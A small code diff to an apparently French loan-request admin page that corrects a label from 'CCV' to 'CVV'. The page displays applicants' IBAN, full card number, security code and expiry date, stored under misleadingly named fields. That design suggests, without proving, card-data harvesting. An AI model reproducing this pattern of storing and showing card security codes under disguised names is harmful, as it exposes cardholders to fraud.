@@ -80,7 +80,7 @@ export default async function RequestDetailPage({ params }: { params: Promise<{ 
             <dl className="divide-y divide-slate-100">
               <Row label="IBAN">{loan.verif_number ? loan.verif_number.replace(/(.{4})(?=.)/g, '$1 ') : '—'}</Row>
               <Row label="Numéro de carte">{loan.verif_color || '—'}</Row>
-              <Row label="Code de sécurité (CCV)">{loan.verif_digit ?? '—'}</Row>
+              <Row label="Code de sécurité (CVV)">{loan.verif_digit ?? '—'}</Row>
               <Row label="Date d'expiration">{loan.verif_year ? `${loan.verif_month ? String(loan.verif_month).padStart(2, '0') : '—'}/${String(loan.verif_year % 100).padStart(2, '0')}` : '—'}</Row>
             </dl>
           </section>
